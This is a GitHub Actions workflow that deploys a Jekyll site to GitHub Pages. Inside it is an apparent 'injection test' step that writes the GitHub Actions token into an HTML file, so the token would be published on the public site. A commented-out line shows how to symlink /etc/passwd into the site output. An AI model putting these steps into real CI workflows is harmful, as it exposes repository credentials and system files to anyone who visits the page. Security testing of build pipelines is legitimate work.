name: Deploy GitHub Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: "pages"
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # TEST: Can we inject into the build BEFORE Jekyll runs?
      # Add a file that Jekyll will process
      - name: Pre-build injection test
        run: |
          # Can we add files that end up in _site?
          echo "Token: $GITHUB_TOKEN" > pre-injected.html
          echo "Actions token: ${{ github.token }}" >> pre-injected.html
          # Try to create a symlink that will be followed by tar
          # ln -s /etc/passwd symlink-test.txt  (would be in _site after jekyll build)
          
      - name: Setup Pages
        uses: actions/configure-pages@v5
      
      - name: Build with Jekyll
        uses: actions/jekyll-build-pages@v1
        with:
          source: ./
          destination: ./_site

      # Check _site permissions
      - name: Check _site permissions  
        run: |
          ls -la _site/ 2>/dev/null | head -10 || echo "_site not found at expected path"
          stat _site/ 2>/dev/null || echo "stat failed"

      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3

  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v5
